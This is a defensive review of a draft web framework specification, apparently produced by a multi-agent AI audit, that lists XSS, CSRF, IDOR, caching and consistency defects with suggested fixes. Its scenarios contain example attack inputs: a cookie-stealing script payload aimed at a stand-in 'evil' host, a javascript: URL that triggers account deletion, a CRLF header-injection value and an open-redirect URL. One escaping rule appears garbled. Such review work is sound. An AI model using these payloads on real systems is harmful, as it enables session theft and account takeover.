# SPEC.md Bug Report — Critical & High-Severity Findings (bugs-1)

**Date:** 2026-06-19
**Target:** `SPEC.md` (Kovo Technical Specification v0.2 draft), the normative source of framework
behavior per `CLAUDE.md`.
**Scope:** Defects in the *normative design/text* — security holes, correctness/soundness gaps,
broken or under-specified functionality, and severe DevEx footguns — that would bite if a conforming
implementation followed the spec exactly. This is a spec review, not an implementation audit.

## How this report was produced

A multi-agent adversarial audit: 10 parallel auditors swept disjoint spec dimensions (auth/CSRF,
injection/XSS, IDOR/live, optimistic/derivation, invalidation/staleness, delta/deploy-skew,
compiler/type soundness, navigation/export, composition/coverage, and a whole-spec contradiction
critic). Raw findings (51) were deduped to 43 canonical items, then **each finding faced two
independent verifiers**: a *refuter* (tries to show the spec already handles it) and an *exploiter*
(tries to build the concrete failing scenario). 30 survived; **13 were rejected by both verifiers**
(listed in the appendix with their rebuttals, for transparency).

Confidence labels below:
- **both-confirm** — both verifiers judged the finding real (highest confidence).
- **contested** — one verifier rejected it; the disagreement is summarized so you can adjudicate.

Severity follows the spec's *own* bar: it markets itself as machine-auditable, build-failing,
CSRF-by-default, IDOR-audited, silent-staleness-killing, and soundly optimistic. A hole in one of
those self-claims is rated against that promise.

## Summary

| Severity | Count | IDs |
| --- | --- | --- |
| **Critical** | 2 | F7, F12 |
| **High** | 13 | F1, F8, F9, F13, F17, F23, F30, F34, F35, F39, F40, F2*, F28* |
| **Medium** | 10 | F3, F4, F5, F6, F19, F27, F20*, F24*, F33*, F36* |
| **Low / minor** | 5 | F22, F32, F10*, F15*, F29* |

`*` = contested (one verifier dissented). Rejected findings: F11, F14, F16, F18, F21, F25, F26, F31,
F37, F38, F41, F42, F43 (appendix).

Two structural themes dominate the high-severity set and are worth fixing as *classes*, not just
instances:
1. **No normative output-encoding/transport-safety layer.** The spec has a meticulous *wiring*
   proof (every residual string has a named validator, §6.1) but no equivalent contract for the
   *values* flowing through bindings, JSON islands, headers, and caches. XSS (F7, F8, F10), header
   injection (F9), and cache cross-user leaks (F34, F35) all live in this gap.
2. **Dangling normative homes.** Several load-bearing guarantees are defined by reference into
   sections that do not exist (`§5.2.1`, `§5.2.3`, `§13.2`, `§15`) — deploy-skew recovery (F30) and
   the `kovo-key` reorder/merge contract (F32) among them.

---

## CRITICAL

### F7 — No normative HTML-escaping contract for the render/binding path; KV236 "unsafe output context" is undefined (XSS) — *both-confirm*

- **Category:** security · **Sections:** §4.8, §6.2, §9.1, §11.3 (KV236), §5.2, §1
- **Defect:** The entire output-safety story rests on an auto-escaping contract that is never stated
  as a normative rule, and the only XSS guard (KV236) is undefined. KV236 says *"Unsafe output
  context requires an explicit trusted Kovo escape hatch (§1, §5.2)"* — but **neither §1 nor §5.2
  defines** what an unsafe output context is, which contexts trigger it, or what the escape hatch is.
  Meanwhile §4.8 makes `data-bind` set text content and `data-bind:<attr>` set arbitrary attributes
  (incl. `href`, IDREFs per §6.2) from runtime query data, with **no stated HTML-encoding and no
  URL-scheme allowlist**. Escaping is specified only for the streaming text case (`<kovo-text>`
  "appends text, not HTML").
- **Scenario (URL-scheme prong — unmitigated):** a query ships
  `{ website: "javascript:fetch('/_m/account/delete',{method:'POST'})" }`; a component binds
  `<a data-bind:href="deal.website">`. On the next `<kovo-query>` push the loader writes the
  attribute verbatim with no scheme check; a click runs attacker JS in the victim's authenticated
  origin — and injected same-origin script can read the page's `kovo-csrf` token and POST valid
  mutations to `/_m/*`. Account takeover via the framework's own endpoints.
- **Evidence:** KV236 → §1/§5.2 (no definition present). §4.8: "`data-bind` sets text content;
  `data-bind:<attr>` sets attributes". §6.2 lists `href`/IDREFs as bound targets. The only encoding
  rule in the spec (§9.1) is scoped to `<kovo-text>`.
- **Verifier note:** The *text-interpolation* prong is partially mitigated — "sets text content"
  implies a `textContent` write, and the §5.2 render-equivalence gate pins the server to the same
  semantics, so `{product.name}` is likely safe even though it is never *stated* to be. The
  **URL-scheme/attribute prong and the undefined KV236 contract are unmitigated** and exploitable;
  that is the critical core. (Refuter: critical; exploiter: high on the attribute prong.)
- [ ] **Fix:** Add a normative rule (in §5.2 hard rules + §4.8) that the server renderer and client
  update plan **contextually encode every interpolated value by default** for text and attribute
  contexts. Define which contexts are "unsafe" under KV236 (raw-HTML insertion; URL-scheme attrs
  `href`/`src`/`action`/`formaction` against a `javascript:`/`data:` denylist; event-handler attrs;
  `style`; `srcdoc`; `<script>`/`<style>` text), require scheme-allowlisting on every `data-bind:*`
  write, and define the KV236 trusted-escape-hatch API so an unsafe binding without it is a compile
  error.

### F12 — Guards are arg-blind, so arg-keyed reads over owner data are structurally unauthorizable (IDOR); the `--unscoped` audit is advisory-only — *both-confirm*

- **Category:** security · **Sections:** §10.2, §9.4, §10.3, §6.3, §11
- **Defect:** A query's only authz primitive is `guard`, defined solely as refining `req.session`
  from session fields. No section passes the query's resolved **args**/instance key to the guard,
  yet the instance key is derived from WHERE eq-predicates that may resolve to client-visible
  `args.*` (§10.2), and `/_q/` coerces those args and runs `guard` on every read (§9.4). A guard can
  therefore express authentication and session-wide roles but **cannot express "the current user owns
  args.id."** The framework markets `--unscoped` as "the IDOR audit," but it is only an
  `explain`/listing command with **no KV error code and no stated build-failure semantics** — in
  stark contrast to the CI-failing silent-staleness family (KV402/407/411).
- **Scenario:** `query('order', { args:{id}, guard: authed, load:(db,args)=> ...where(eq(orders.id,
  args.id)) })`. Attacker (any logged-in user) calls `GET /_q/order?id=<victim_order_id>`; `authed`
  passes but never sees `id`, so the handler returns the victim's order — full IDOR read of any
  owner-scoped record. `kovo check` prints `order` in the unscoped list but, being advisory, the
  build stays green and ships.
- **Evidence:** §10.2 instance key "resolved to `args.*` or `req.session.*` — only args are
  client-visible"; §9.4 "guard is checked on every read" (but no section gives the guard the args);
  §10.3 `--unscoped` "the IDOR audit" / §11 folds it into `kovo check` as an audit with no failure
  semantics; §11.3 gives KV402/407/411 hard `error` rows, none to the unscoped condition.
- **Verifier note:** The intended safe pattern *is* session-scoped WHERE predicates (`eq(carts.id,
  req.session.cartId)`), so "structurally unauthorizable" is slightly overstated for
  session-derivable keys. The genuine critical gap is the asymmetry: **stale UI is a hard error
  while cross-owner data exposure is left to a human-read listing, and the guard primitive cannot
  even express the fix** for arg-keyed reads. (Exploiter: critical; refuter: high.)
- [ ] **Fix:** Give the query guard the validated args/instance key, and document an ownership
  combinator (e.g. `owns(a => a.id, orders.userId)`). Add a **blocking, runtime-verified** code
  (e.g. KV414) that fires when a query/write touches an `owner:`-annotated table with a key predicate
  not traceable to `req.session` and not authorized by an ownership guard, with a
  suppression-with-recorded-justification escape for genuinely public reads. The IDOR audit must be
  an enforced gate, not advisory.

---

## HIGH

### F1 — `csrf: false` on a session-authenticated mutation reintroduces classic CSRF, contradicting the §9.1 exemption-soundness rule — *both-confirm*

- **Category:** security · **Sections:** §6.6, §9.1, §10.3
- **Defect:** §6.6 makes `csrf: false` "the only per-mutation opt-out … reserved for non-browser or
  externally authenticated endpoints" — but a `mutation()` always receives the cookie-derived
  `req.session` (§6.5/§9.5) and runs its guard chain against it (§10.3). §9.1 states the exact
  soundness rule this violates: for endpoints, "A CSRF exemption is sound *only because*
  endpoint/webhook auth does not ride ambient browser authority … cookies are not interpreted and no
  ambient `req.session` is passed." For mutations the exemption is gated only by a non-normative
  "reserved for" sentence, with no Origin/Referer check, no SameSite mandate, and **no visibility in
  the `--endpoints` audit** (which lists endpoints/webhooks/file-stream routes, not mutations).
- **Scenario:** Author sets `csrf:false` on `mutation('account/delete', { guard: authed })` "for the
  mobile app." `attacker.com` auto-submits a cross-site form to `/_m/account/delete`; the victim's
  cookie rides (no SameSite mandated), CSRF is skipped, `authed` passes on the ambient session, the
  account is deleted. No audit surface flags it.
- **Verifier note:** Both verifiers confirmed; downgraded critical→high only because CSRF is
  default-on and this requires a deliberate opt-out. Still account-takeover-class.
- [ ] **Fix:** Mirror the endpoint guarantee — make it a compile error (a KV code, surfaced in
  `--endpoints`/`--unguarded`) for a `csrf:false` mutation to reference ambient `req.session` /a
  cookie-derived guard, **or** strip ambient session from `csrf:false` mutations so the exemption is
  sound by construction. Route truly non-browser writes to `endpoint()`/`webhook()`.

### F8 — Query JSON in `<script type="application/json">` / `<kovo-query>` has no `</script>`-safe escaping contract (stored XSS) — *both-confirm*

- **Category:** security · **Sections:** §4.1/§4.2, §9.1, KV236
- **Defect:** Query values ship inline as `<script type="application/json" kovo-query="…">{…}</script>`
  and on every mutation as `<kovo-query>{…}</kovo-query>`. HTML tokenization ends a script (and
  custom-element raw text) at the first literal `</script>`/`<!--`/`<script` regardless of JSON
  quoting; JSON escaping does **not** escape `<`. The spec never specifies script-data-context
  encoding for these data islands and shows the canonical example payload unescaped.
- **Scenario:** A user sets their display name to `</script><script>fetch('//evil/'+document.cookie)
  </script>`. A query selecting that name ships it in the page island or a post-write `<kovo-query>`
  response; the browser ends the JSON script at the injected `</script>` and runs attacker JS in the
  victim's session. §9.3 BroadcastChannel rebroadcast then propagates the poisoned chunk to sibling
  tabs.
- **Verifier note:** high not critical — KV236 + §9.1's "never inserts model output as raw HTML"
  signal an intent to escape, so not every conforming impl ships it; but the byte-level contract is
  genuinely missing.
- [ ] **Fix:** Mandate that JSON serialized into `<script type="application/json">`/`<kovo-query>`
  islands is encoded for the script-data context (at minimum `<` → `<`, or escape the
  `</script`/`<!--`/`<script` sequences), as a normative renderer rule with a conformance test.

### F9 — Mutation header channel permits `Set-Cookie`/cache headers with no CRLF/header-injection guard — *both-confirm*

- **Category:** security · **Sections:** §9.1.1
- **Defect:** §9.1.1 lets handlers attach response headers — explicitly `Set-Cookie` and cache
  headers — merged with framework headers post-commit. The only constraints are *authority*-scope
  (no body/status change); there is **no requirement** to validate header names/values against
  CR/LF/NUL or confine them to safe characters. The spec's otherwise-meticulous injection discipline
  (KV236, `<kovo-text>`, `Kovo-Changes` sanitization) has no analogue here.
- **Scenario:** A handler sets `Set-Cookie` from user input: `ctx.headers.set('Set-Cookie', 'prefs='
  + input.prefs)`. Attacker submits `prefs = x\r\nSet-Cookie: session=ATTACKER\r\n` → response
  carries an attacker-chosen session cookie (fixation), or with `\r\n\r\n` splits the response.
- **Verifier note:** High; some HTTP runtimes reject literal CRLF at the platform layer, but the
  spec can't rely on that, and cookie-attribute injection within a value needs a structured builder.
- [ ] **Fix:** Require the channel to reject/strip CR/LF/NUL in header names and values, restrict
  settable names to a typed allowlist with structured value builders (typed cookie builder), and
  state this as normative for both the enhanced and no-JS merge paths.

### F13 — BroadcastChannel rebroadcast leaks one session's private query data to a different user on the same origin — *both-confirm*

- **Category:** security · **Sections:** §9.3
- **Defect:** §9.3 rebroadcasts a mutation's `<kovo-query>` response to "the user's other tabs" over
  BroadcastChannel, which is **origin-scoped, not session/principal-scoped**, with **no receive-side
  session check** — in deliberate contrast to the SSE path one bullet later, which re-checks the
  guard "at each push … fragments must not become a privilege-escalation side channel." Because
  session-derived instance keys strip the session id (§10.2), Tab A and Tab B key the same query
  identically (`cart`), so a rebroadcast of A's private data is morphed straight into B's store.
- **Scenario:** Shared/kiosk or fast-user-switch device: A is logged in (tab 1), B logs in (tab 2)
  or A logs out and B logs in. A mutates → `<kovo-query name="cart">` (A's PII) is rebroadcast on the
  origin channel → tab 2 (now B) morphs A's data into B's UI. No attacker code needed.
- **Verifier note:** High; gated on a shared-device precondition (separate browser profiles don't
  share a channel), but a real automatic cross-principal disclosure. The §1.1 "cross-session
  liveness out of guarantee" caveat is about *freshness*, not *confidentiality*, so it does not
  cover this.
- [ ] **Fix:** Carry a session/principal fingerprint on the rebroadcast envelope; the receiving tab
  discards messages whose fingerprint ≠ its current `req.session` identity, and drops the channel on
  session change. Specify it as normatively as the SSE re-check.

### F17 — Rebase re-applies pending transforms already reflected in arriving server truth, double-counting writes — *both-confirm*

- **Category:** correctness · **Sections:** §10.4, §10.3, §9.1, §9.3
- **Defect:** Rebase is "arriving server truth is morphed in, then still-pending transforms
  re-applied in order … Safe because transforms are pure `(data, input)` functions." Purity gives
  determinism, **not idempotency.** Server truth is the post-commit re-run of the invalidated query
  (§10.3), so it already includes its own commit; the client holds **no metadata** about which
  pending transforms a given truth chunk already incorporates (`Kovo-Changes` is `{domain, keys}`
  only). When A and B both invalidate one query and B's truth (already reflecting A) arrives while A
  is still pending, A's additive transform re-applies on top → double count.
- **Scenario:** Fire A=addToCart(p1,2) then B=addToCart(p2,1) without `queue:`. B's `<kovo-query
  name="cart">` returns first already including A's commit; rebase re-applies still-pending A
  (`r.qty += 2`) → p1.qty = 4 instead of 2. Compounds per rebase; self-heals only when A's own
  response arrives.
- **Verifier note:** High; transient mid-flight display error, not DB corruption, and `queue:` opts
  out — but it is silent while it lasts and the default cart example is directly vulnerable, breaking
  the §10.6 no-silent-inconsistency claim.
- [ ] **Fix:** Server-truth chunks must carry the set of mutation/idempotency keys (`Kovo-Idem`)
  whose commits they reflect; the runtime settles (drops) exactly those transforms from each
  per-query log **before** morphing, re-applying only not-yet-committed transforms. Define the
  settlement-matching rule normatively.

### F23 — Manual `touches` (KV406) under-coverage on an unexecuted branch ships silent stale UI to production; KV405 is non-blocking and KV406 severity is ambiguous — *both-confirm*

- **Category:** correctness · **Sections:** §11.2, §11.1, §10.3, §11.3, §10.1
- **Defect:** Soundness for opaque/raw-SQL writes rests on a hand-written `touches` declaration
  called "runtime-verified" — but the runtime cross-check (a) runs only in dev/test, never
  production, and (b) "under-approximates (executed branches)." The only signal for an unexecuted
  conditional write is KV405, which is `warn` (explicitly "non-blocking on dev transform, build, and
  static export"). Worse, **KV406's registry severity is the bare `warn/error` with no rule for
  which applies**, even though §11.3 says the registry is the single source of severity that surfaces
  must not override.
- **Scenario:** `restock: write({ touches: ['inventory'] }, db => db.execute(sql`… UPDATE products
  SET stock = … WHERE cross_warehouse …`))`. The `products` write is in a CTE arm only hit on a
  cross-warehouse transfer; dev fixtures never trigger it; static extraction can't see inside the raw
  `sql`. In production a real transfer fires it, `products.stock` changes, no product query is
  invalidated, every open product page shows stale stock indefinitely — no diagnostic.
- **Verifier note:** Contested on the framing (refuter argued the *deliberate-smuggle* angle is
  weaker because honest authors declare touches), but both agreed the real defect — **dev/test
  coverage is treated as proof of KV406 completeness, KV405 doesn't gate, and KV406 severity is
  undefined** — is genuine.
- [ ] **Fix:** Pin KV406 to `error` whenever a manual `touches` is absent at an unresolved/node_modules
  write site (remove the `warn/error` ambiguity); raise KV405 to `error`/CI-gating for any write
  site whose touch set can't be fully resolved statically; state that dev/test coverage does not
  prove KV406 completeness; and require raw-SQL writes to enumerate touched tables via a
  structurally-parsed allowlist the executor enforces (fail-closed conservative invalidation on an
  out-of-`touches` production write).

### F30 — Deploy-skew recovery, version-token definition, and retention window have no normative home (`§5.2.1`, `§5.2.3`, `§15` are dangling) — *both-confirm*

- **Category:** correctness · **Sections:** §9.1.1, §6.6, §5.1, §5.2
- **Defect:** §9.1.1 makes deploy-skew safety mandatory and load-bearing — a delta applies only when
  the render-plan version token matches, else refetch full ("silently-wrong → loud-and-recoverable").
  But the token is cited as `(§5.1)`, stamped "alongside the cache-busting hash `(§5.2.1)`", the prod
  gate as `(§5.2.3)`, and the recovery contract as `(§15)` — and **§5.1 defines no token, there is no
  §5.2.1/§5.2.3, and no §15.** The token's derivation inputs, stamping points, comparison rule, the
  prod render-equivalence gate, and the "supported deploy-skew window" retention parameter (§6.6) are
  all named but never defined.
- **Scenario:** An implementer follows "§5.1," finds nothing, derives the token from module content
  hash. A redeploy adds a nullable column (query shape changes) but the client module's content hash
  is unchanged; the server emits a delta, the token "matches," yesterday's shape merges against
  today's → garbled DOM, no refetch. Separately, with no minimum retention specified, a stale tab's
  `/c/__v/<N>/<module>` 404s — contradicting §6.6's "never 404s."
- [ ] **Fix:** Write normative §5.1/§5.2.1 text defining the render-plan version token — inputs MUST
  include every query's projected shape and the update-plan grammar (so a shape change always changes
  the token), where it is stamped, and the mandatory server/client comparison. Define §5.2.3 (prod
  render-equivalence gate) and add §15 specifying a **required minimum prior-version retention
  window**. Require `/_q/` responses to carry the token so plain refetches into a stale tab are
  detected too.

### F34 — bfcache guarantee restores guarded pages after logout (no `pageshow` revalidation / `no-store`) — *both-confirm*

- **Category:** security · **Sections:** §8, §9.5
- **Defect:** §8 makes bfcache eligibility a **hard framework guarantee for every document** (no
  `unload` handlers, etc.) but the spec specifies no `Cache-Control: no-store`, no `pageshow`/
  `persisted` revalidation hook, and no logout-driven invalidation. A bfcache restore is a history
  traversal that bypasses the loader and the network, so the route guard and `sessionProvider` never
  re-run. (Grep confirms `no-store`/`pageshow`/`persisted` appear nowhere in the spec.)
- **Scenario:** User views `/account` (`guard: authed`, PII) on a kiosk, logs out (cookie cleared),
  redirected to `/`. Next person presses Back → browser restores the cached authenticated `/account`
  DOM with no server round-trip; the guard never runs; the logged-out viewer sees the prior user's
  account. Same on session expiry/revocation.
- [ ] **Fix:** Make bfcache hygiene conditional on cache posture: guarded/session-dependent route
  documents MUST carry `Cache-Control: no-store`, and the loader MUST register a `pageshow` handler
  that reloads when `event.persisted` and the document was rendered under a guard. Tie the posture to
  the same "unproven session dependence" proof the export path computes (§9.5/KV229); keep
  anonymous/exportable documents bfcache-eligible.

### F35 — Typed read endpoint `/_q/` has no `Cache-Control`/`Vary` contract: guarded query JSON leaks across users via shared caches — *both-confirm*

- **Category:** security · **Sections:** §9.4, §9.3, §9.5
- **Defect:** Every query is a plain credentialed `GET /_q/<key>?args` returning per-user
  session-dependent JSON, with a guard checked on every read — but **no caching directives** (no
  `Cache-Control: private`/`no-store`, no `Vary: Cookie`). A URL that varies only by args and not by
  identity is a textbook shared-cache key collision; the §9.4 example response shows
  `Content-Type: text/html` and nothing else. This surface is hit heavily by refetch-on-focus (§9.3).
- **Scenario:** A's loader fetches `GET /_q/order?id=o1` (guard: ownsOrder). A CDN/corporate proxy
  caches the 200 keyed on URL (nothing forbids it). B requests the same URL and the cache serves A's
  order without reaching the guard — guard-at-every-read bypassed by the intermediary.
- [ ] **Fix:** Mandate that `/_q/` responses for guarded/session-dependent queries carry
  `Cache-Control: private, no-store` and `Vary: Cookie` by default, relaxing only for queries proven
  session-independent. State it as a normative wire requirement in §9.4.

### F39 — Fragment morph silently destroys the nested child-island local state it claims to preserve — *both-confirm*

- **Category:** correctness · **Sections:** §9.1, §4.5, §4.9
- **Defect:** Two normative statements collide. §9.1 lists "nested island state" among what a
  `<kovo-fragment>` morph preserves. But §4.5 rule 3 says a refreshable target "re-renders the full
  subtree on fragment patch" from (declared queries ∪ stamped props), and §4.9 says `fragment` is
  "not a state remedy … unless a later SPEC defines how client-private state participates in server
  fragments." Island-local state is never in the query/prop channels and has no on-the-wire
  serialization, so a refreshed parent re-emits any nested child island at its **render-time default
  state**, and the morph overwrites the child's live local state. §9.1's claim is true only for
  ambient UA state (focus/scroll/selection/transitions).
- **Scenario:** `<deal-card>` (fragment target on `deal`) nests `<note-editor>`, an L1 island whose
  local state holds an in-progress unsaved draft. A mutation invalidates `deal`; the selector
  re-renders `deal-card`'s subtree; the server renders `<note-editor>` with `draft=''`; the morph
  wipes the user's draft. No KV311 fires (the position is inside a covered `fragment` target).
- [ ] **Fix:** Resolve the contradiction — either (a) restrict §9.1's survival claim to UA/DOM state
  and add a compile-time rule (KV311-class) that an island declaring local state may not nest inside
  another component's server-refreshable fragment target, or (b) define a normative `kovo-state`
  runtime serialization the morph preserves so a default-state re-render cannot clobber a live child
  island.

### F40 — Isomorphic island self-render drifts from server output because client self-render has no children/slot arguments — *both-confirm*

- **Category:** correctness · **Sections:** §4.8, §4.9, §4.5
- **Defect:** §4.8 sanctions `isomorphic: true` ("the island re-renders itself and self-morphs … the
  same render function the server uses (partials cannot drift)"). That soundness claim fails for any
  isomorphic island that **composes children**: the render takes `(queries, state, { children,
  …slots })`; on the server children are real projected `Html`, but a client self-render has **no
  slot/children arguments** (projected children ship once in initial HTML, §4.5, with no client lazy
  mount and no KV230 hoisting requirement for isomorphic islands). Identical code over different
  argument bindings produces different output.
- **Scenario:** `<tab-group isomorphic>` composes projected `<Tabs.Panel>` children. Initial server
  render emits all panels. User clicks a tab → `state.active` changes → the loader invokes the
  emitted render to self-morph, but the client call has no `children` arg → renders an empty body and
  morphs the panels away. The page silently loses all projected content on first interaction.
- [ ] **Fix:** Specify how an isomorphic island receives children/slots on client self-render: either
  require KV230 hoisting-to-serializable-props so children are reconstructible client-side, or forbid
  `isomorphic: true` on components that accept children/slots, or define that self-morph preserves
  projected-children DOM regions and re-renders only the island's own positions.

### F2 — Login `next` parameter is an unconstrained open-redirect / phishing vector — *contested*

- **Category:** security · **Sections:** §6.5
- **Defect:** §6.5's default `onUnauthenticated` is "a 303 redirect to the configured login route
  with the original URL available as `next`." The spec never constrains `next` to a same-origin,
  path-only value, nor says who validates it before the post-login redirect consumes it — unlike §8
  (enhanced nav only intercepts same-origin) and §6.4 (`external` marker for full-origin hrefs).
- **Scenario:** Attacker links the victim to the login flow with `?next=https://evil.example/login`
  (or `//evil.example`). After a successful credential POST, the app's login flow redirects to the
  attacker domain; the freshly-authenticated victim lands on a phishing clone.
- **Verifier note:** Contested — the *refuter confirmed* the framework surfaces an unvalidated
  `next` with no same-origin constraint; the *exploiter* rated it low because the unsafe redirect is
  ultimately performed by app-authored login code, not the framework directly. Still a real
  framework-surface gap: the framework hands `next` to the app without constraining it.
- [ ] **Fix:** Make `next` framework-validated — require a same-origin, single-leading-slash absolute
  path within the route table; reject/strip `//`, scheme, or off-table values to a safe default,
  validated at construction and again wherever the framework hands `next` to the login flow.

### F28 — Non-streaming mutation replay is a lookup, not a reservation — concurrent identical submits both execute — *contested*

- **Category:** correctness · **Sections:** §10.3, §9.1
- **Defect:** The ordinary lifecycle does "replay lookup by session/idempotency key" — a *read* of
  stored responses with no in-flight reservation. Only the streaming path names a "replay/idempotency
  *reservation*." With a pure lookup, two concurrent submits with the same idem key both miss the
  store, both run the handler and COMMIT → double write. The mechanism dedupes only strictly
  sequential retries, not the concurrent retries idempotency keys exist to neutralize.
- **Scenario:** On a slow link the user double-clicks "Pay." Two POSTs with the same `Kovo-Idem`
  arrive together; both lookups miss before either commits; both insert the charge → double charge.
- **Verifier note:** Contested — the *refuter* argued the shared "`Kovo-Idem` machinery" (whose
  webhook description says "must not re-execute the handler") implies reservation semantics apply to
  all paths; the *exploiter* held that the ordinary path says only "lookup," so a literal reading
  permits concurrent double-execution. Worth pinning regardless, given the payment blast radius.
- [ ] **Fix:** Specify an atomic reservation (unique-key claim / `INSERT … ON CONFLICT` under the tx
  boundary) for **all** mutation paths, so a concurrent second submit with the same key blocks or
  replays rather than re-executing.

---

## MEDIUM

### F3 — CSRF synchronizer token undefined for anonymous (null-session) forms; login/signup unprotected, session-fixation risk — *both-confirm (fixation prong contested)*

- **Sections:** §6.5, §6.6 · **Category:** security
- §6.6 defines `kovo-csrf` as "a session-bound synchronizer token stamped into every emitted form,"
  but §6.5 says a null/undefined provider result means "anonymous." The pre-auth forms that most need
  CSRF (login, signup, password-reset) have **no session to bind a token to**, and the spec never
  defines anonymous-CSRF binding or token/session rotation on login. (The verifier rejected the
  fixation sub-scenario as a misread — Kovo doesn't own session identity, so it can't "fail to
  rotate" — but the **login-CSRF prong stands**: the synchronizer token on an anonymous form is
  unbindable as specified.)
- [ ] **Fix:** Specify an anonymous-CSRF contract — bind the token to a framework-owned signed
  cookie secret that exists independent of `sessionProvider`; add a normative rule that
  login/signup/reset forms are CSRF-protected even when `req.session` is null; and recommend session
  rotation on auth at the app layer.

### F4 — Replay/idempotency lookup precedes the guard chain, re-serving a cached private response without re-authorizing — *both-confirm (cross-principal prong contested)*

- **Sections:** §10.3, §9.1 · **Category:** security
- The lifecycle runs "replay lookup … → guard chain," so a replay hit returns the stored response
  (private `<kovo-query>` data) **before** `authed`/`role()`/ownership refinements re-run.
  Authorization is evaluated only at first execution; the cached result is re-served even if the
  principal's authorization has since changed (role revoked). The verifier rejected the
  *cross-principal* exfiltration sub-claim (the lifecycle keys replay "by session," and CSRF is
  session-bound and verified first), leaving the **stale-authorization prong** as the real gap.
- [ ] **Fix:** Re-check session-bound authorization against the current principal before serving a
  replayed response (or run the guard chain before replay). Normatively key the replay store on
  (principal ∧ mutation-key ∧ idem-value).

### F5 — Rate limiting runs inside the guard chain (after CSRF/replay/parse); `per:'session'` is useless for anonymous floods; no body-size/IP/global limiter exists — *both-confirm*

- **Sections:** §10.3, §6.5, §9.4, §9.1, §9.5 · **Category:** security
- `rateLimit({per:'session'})` is a guard combinator, and guards run **after** CSRF verification,
  replay-store lookup, and full schema parse/coercion — so a flood incurs all of that before the
  limiter sheds load. `per:'session'` can't distinguish many null-session attackers. No normative
  per-IP/global limiter or max body size exists, and §9.5 states "there is no user middleware chain
  in v1," removing the only generic chokepoint, while §9.4/§9.1 expose expensive DB paths.
- [ ] **Fix:** Move a coarse global/per-IP limiter ahead of replay+parse in the lifecycle; add a
  `per:'ip'`/global dimension; specify normative defaults (max request/body size → 413; default
  per-principal/per-IP `/_m/` and `/_q/` limits → 429; a bound on fragment-targets reconstructed per
  response), enforced by the request shell/adapter before dispatch, and surfaced in `--endpoints`.

### F6 — Mutation guard failure has no auth-redirect vocabulary; an expired-session enhanced form shows a typed error instead of re-authenticating — *both-confirm*

- **Sections:** §6.5, §9.2, §10.3 · **Category:** correctness/DevEx
- §6.5: route/query `authed` failures redirect to login, but "Mutation guard failures keep the §9.2
  typed-error path: no redirect body vocabulary is introduced." §9.2 returns a 422 form fragment with
  `forms.<mutation>.failure` and **no defined `code` for "unauthenticated,"** so a routine
  session-expiry on submit surfaces as a generic validation-style error with no path to re-auth —
  diverging from how a page route handles the same expired session.
- [ ] **Fix:** Define a normative auth-failure outcome for mutations distinct from validation/app
  failures — e.g. a 401 + `Kovo-Reauth` directive the loader follows to login with `next`, and a 303
  to login on the no-JS path.

### F19 — `queue:'cart'` FIFO can starve/deadlock optimistic UI with no specified timeout or failure-drain — *both-confirm (most prongs reduced)*

- **Sections:** §10.4, §9.1 · **Category:** functionality
- "Mutations needing serialization declare `queue:'cart'` (named FIFO)" but the spec never pins
  head-of-line timeout/abort for a hung in-flight head, nor whether queued mutations apply their
  optimistic transform on enqueue vs dequeue. (The verifier reduced the "failed head" prong — §10.4's
  on-error snapshot-restore covers failures — leaving the **hung/never-resolving head with no
  timeout** and the **enqueue-vs-dequeue application** as genuine underspecifications that make two
  conforming impls diverge between "frozen cart" and "dropped actions.")
- [ ] **Fix:** Specify FIFO semantics: when a queued transform applies, head-of-line timeout/abort,
  how a failed/hung head drains the tail, queued-but-unsent fate on navigation, and a queue bound.

### F27 — `Kovo-Idem` is a client-controlled hidden field with unspecified per-submit uniqueness — silent lost updates or cross-replay — *both-confirm*

- **Sections:** §9.1, §6.6, §10.3 · **Category:** correctness
- Replay lookup precedes input parsing, so the idem key can't incorporate input. The spec never says
  the client mints a fresh token per logical submit, and a hidden field rendered into a form is
  unchanged across re-submits of the same instance. So editing visible fields and re-submitting the
  same form re-sends the same token with different input → the server replays the **first** response
  and silently drops the second mutation (lost update). Unspecified entropy also allows collisions.
- [ ] **Fix:** Mint a fresh high-entropy idem token per submit (and refresh the hidden field in the
  enhanced success response); scope the store by (session, mutation-key, idem-token); state the
  entropy/uniqueness requirement.

### F20 — "Missing server truth" path leaves an un-reconciled optimistic prediction on screen as silent staleness — *contested*

- **Sections:** §10.4 · **Category:** correctness
- §10.4: the client treats missing server truth as "a visible runtime diagnostic, then settles that
  transform without promoting the prediction to authoritative data." Settling without restoring the
  snapshot leaves the predicted value rendered with no authority and no correction path. The verifier
  noted this is scoped to **"during development"** (a dev escape valve, with KV310 exhaustiveness
  preventing it in production), which is why it's medium/contested — but "settle without promotion"
  shown to an end user is still ambiguous.
- [ ] **Fix:** On missing truth, roll the query back to its pre-transform snapshot (or force a `/_q/`
  refetch) rather than freezing the unconfirmed prediction; "settle" must mean "discard," and a
  dev-only diagnostic must not be the production contract.

### F24 — Raw-SQL/opaque-projection reads of exempt or unmodeled tables can escape both static read-set extraction and the dev-only runtime check — *contested*

- **Sections:** §10.1, §10.2, §11.2, §11.1 · **Category:** correctness
- KV411 forbids exempt-table reads, but an opaque `sql<T>` projection (KV410) hides which tables it
  reads and substitutes an output schema that says nothing about source tables; runtime verification
  is dev/test-only and under-approximates. So an opaque projection reading an exempt/outbox table on
  an unexercised branch is caught by neither half. The verifier noted the spec **already** offers a
  read-side `reads` override (§11.1) and explicitly carves raw-SQL seams out of the static proof
  (§1.1) — so this is partly "use the existing escape hatch" — but the spec does not *require*
  `reads` on KV410 sites, leaving the hole open by default.
- [ ] **Fix:** Require KV410 opaque projections to declare a `reads:`/`from:` table set (statically
  checked against exemption and fed into the read set), not relying on runtime observation alone.

### F33 — Author-static `aria-*` "wins" over a primitive's runtime-updated ARIA, freezing a11y state with only a lint — *contested*

- **Sections:** §4.6 · **Category:** functionality/a11y
- The merge table resolves `aria-*`/`role` as "Author wins, lint KV232," but resolves `data-state`
  as "Primitive wins … a static override would be clobbered on first state change." That same
  runtime-clobber hazard applies to state-bearing ARIA (`aria-expanded`/`selected`/`checked`/
  `pressed`), yet the table inverts the resolution and never says whether the primitive's runtime
  updater still drives the attribute after the author wins. Either reading is bad (frozen ARIA, or
  silently-clobbered author value). The exploiter rated it not-a-bug arguing the primitive could keep
  updating; the refuter confirmed the spec is genuinely silent on which happens.
- [ ] **Fix:** Split the `aria-*` row — descriptive ARIA (`aria-label`/`describedby`) keeps
  author-wins-lint; **state ARIA** the primitive updates follows the `data-state` rule (primitive
  wins, or author override is an error), and state that the primitive's runtime derive keeps owning
  the attribute regardless of the static merge winner.

